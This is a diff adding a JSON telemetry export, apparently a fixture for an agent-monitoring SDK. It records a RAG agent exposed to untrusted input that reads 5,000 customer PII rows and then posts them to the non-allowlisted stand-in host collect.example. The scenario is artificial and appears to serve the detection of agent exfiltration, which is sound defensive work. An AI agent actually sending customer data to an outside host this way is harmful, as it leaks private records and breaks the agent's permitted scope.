@@ -1,0 +1,78 @@
+{
+  "schema_version": "1.0",
+  "export": {
+    "export_id": "7f3c9a12-0e4b-4d77-9a1e-12ab34cd56ef",
+    "generated_at": "2026-06-09T10:00:00Z",
+    "source": "wma-sdk@1.1.6",
+    "time_window": { "start": "2026-06-09T09:55:00Z", "end": "2026-06-09T10:00:00Z" },
+    "redaction_level": "pii_masked"
+  },
+  "fractal_context": {
+    "tenant_id": "tenant-acme",
+    "fleet_id": "fleet-support",
+    "teams": [
+      { "team_id": "team-kb", "workflow": "support_knowledge_base", "agent_ids": ["agent-rag-01"] }
+    ],
+    "agents": [
+      {
+        "agent_id": "agent-rag-01",
+        "agent_type": "data_rag",
+        "modifiers": ["untrusted_input", "data_sensitivity", "regulated"],
+        "model": "claude-opus-4-6",
+        "autonomy_level": "autonomous",
+        "deployed_template": { "template_id": "tmpl.data_rag", "version": "1.0.0" }
+      }
+    ]
+  },
+  "events": [
+    {
+      "event_id": "evt-001",
+      "timestamp": "2026-06-09T09:56:10Z",
+      "agent_id": "agent-rag-01",
+      "trace_id": "trace-aaa",
+      "span_id": "span-1",
+      "type": "llm_call",
+      "io": { "input_tokens": 4200, "output_tokens": 380, "cost_usd": 0.06, "prompt_digest": "sha256:abcd" },
+      "result": { "status": "success", "duration_ms": 1800 },
+      "security_context": {
+        "data_classification": "internal",
+        "untrusted_input_in_context": true
+      }
+    },
+    {
+      "event_id": "evt-002",
+      "timestamp": "2026-06-09T09:57:02Z",
+      "agent_id": "agent-rag-01",
+      "trace_id": "trace-aaa",
+      "span_id": "span-2",
+      "parent_span_id": "span-1",
+      "type": "tool_call",
+      "tool": { "name": "customers.query", "category": "database", "parameters": { "table": "customers", "row_count": 5000 } },
+      "result": { "status": "success", "duration_ms": 320 },
+      "security_context": {
+        "auth_principal": "svc-rag",
+        "permissions_used": ["db.read"],
+        "data_classification": "pii",
+        "untrusted_input_in_context": true
+      }
+    },
+    {
+      "event_id": "evt-003",
+      "timestamp": "2026-06-09T09:57:45Z",
+      "agent_id": "agent-rag-01",
+      "trace_id": "trace-aaa",
+      "span_id": "span-3",
+      "parent_span_id": "span-2",
+      "type": "network_egress",
+      "tool": { "name": "http.post", "category": "http", "parameters": { "url": "https://collect.example/upload" } },
+      "result": { "status": "success", "duration_ms": 540 },
+      "security_context": {
+        "data_classification": "pii",
+        "destination": "collect.example",
+        "destination_allowlisted": false,
+        "external_egress": true,
+        "untrusted_input_in_context": true
+      }
+    }
+  ]
+}
